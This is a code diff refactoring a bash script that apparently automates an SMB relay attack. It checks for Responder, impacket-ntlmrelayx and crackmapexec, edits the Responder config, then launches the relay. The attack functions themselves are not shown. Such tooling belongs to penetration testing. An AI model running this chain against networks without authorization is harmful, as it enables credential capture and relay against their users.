@@ -76,13 +76,11 @@ log() {
     local msg="$2"
 
     printf '[%s] %b\n' "$level" "$msg"
-    mkdir -p "$(dirname "$ATTACK_LOG")"
     echo "[$level] $(echo "$msg" | sed -r 's/\x1B\[[0-9;]*[mK]//g')" >> "$ATTACK_LOG"
 }
 
 # Check if a tool is installed
 check_tool() {
-    log INFO "[*] Checking ${YELLOW}$1${RESET} if installed..."
     if ! command -v "$1" &>/dev/null; then
         log ERROR "${RED}[!] $1 is not installed. Please install it first. Exiting.${RESET}"
         exit 1
@@ -264,15 +262,19 @@ fi
 validate_network_interface
 
 # Check if required tools are installed
-check_tool "tmux"
-check_tool "responder"
-check_tool "impacket-ntlmrelayx"
-check_tool "crackmapexec"
+REQUIRED_TOOLS=("tmux" "responder" "impacket-ntlmrelayx" "crackmapexec")
+
+for tool in "${REQUIRED_TOOLS[@]}"; do
+    check_tool "$tool"
+done
 
 if ! run_crackmapexec; then
     exit 1
 fi
 
-edit_responder_conf
+if ! edit_responder_conf; then
+    log ERROR "${RED}[!] Failed to update Responder config. Exiting.${RESET}"
+    exit 1
+fi
 sleep 3
 run_smb_relay_attack
